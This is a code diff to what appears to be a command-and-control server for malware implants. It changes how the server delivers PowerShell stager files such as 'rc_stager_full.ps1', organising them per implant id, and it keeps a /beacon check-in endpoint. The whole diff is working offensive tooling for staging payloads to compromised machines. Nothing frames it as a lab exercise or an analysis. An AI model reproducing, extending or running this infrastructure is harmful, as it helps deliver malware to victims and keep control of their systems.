@@ -349,33 +349,36 @@ _app_ref: C4Console | None = None
 # File serving (stager delivery)
 # ---------------------------------------------------------------------------
 
-_SERVE_DIR: Path | None = None  # set via --serve-dir
+_SERVE_DIR: Path | None = None  # set via --serve-dir (points at out/)
 
 
 async def handle_serve(request: web.Request) -> web.Response:
-    """Serve files from the stager output directory (e.g. GET /serve/rc_stager_full.ps1)."""
+    """Serve files from implant output dirs (e.g. GET /serve/<implant-id>/rc_stager_full.ps1)."""
     if _SERVE_DIR is None:
         return web.Response(text="File serving not configured", status=503)
 
-    filename = request.match_info.get("filename", "")
+    filepath = request.match_info.get("filepath", "")
     # Prevent path traversal
-    safe_path = (_SERVE_DIR / filename).resolve()
+    safe_path = (_SERVE_DIR / filepath).resolve()
     if not str(safe_path).startswith(str(_SERVE_DIR.resolve())):
         return web.Response(text="Forbidden", status=403)
 
     if not safe_path.is_file():
         return web.Response(text="Not found", status=404)
 
-    log.info("Serving file: %s → %s", request.remote, safe_path.name)
+    log.info("Serving file: %s → %s", request.remote, filepath)
     return web.FileResponse(safe_path)
 
 
 async def handle_serve_index(request: web.Request) -> web.Response:
-    """List available files in the serve directory."""
+    """List available implants and their files in the serve directory."""
     if _SERVE_DIR is None:
         return web.Response(text="File serving not configured", status=503)
-    files = [f.name for f in _SERVE_DIR.iterdir() if f.is_file()]
-    return web.json_response({"files": sorted(files)})
+    implants = {}
+    for d in sorted(_SERVE_DIR.iterdir()):
+        if d.is_dir():
+            implants[d.name] = sorted(f.name for f in d.iterdir() if f.is_file())
+    return web.json_response({"implants": implants})
 
 
 # ---------------------------------------------------------------------------
@@ -403,7 +406,7 @@ async def start_http(port: int) -> web.AppRunner:
     app = web.Application()
     app.router.add_post("/beacon", handle_checkin)
     app.router.add_get("/serve", handle_serve_index)
-    app.router.add_get("/serve/{filename:.+}", handle_serve)
+    app.router.add_get("/serve/{filepath:.+}", handle_serve)
     runner = web.AppRunner(app, access_log=None)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", port)
@@ -1000,7 +1003,7 @@ def main() -> None:
         "--serve-dir",
         type=Path,
         default=None,
-        help="Directory to serve files from (e.g. out/<implant-id>). Accessible at GET /serve/<filename>",
+        help="Root output directory (e.g. out/). Files accessible at GET /serve/<implant-id>/<filename>",
     )
     args = parser.parse_args()
 
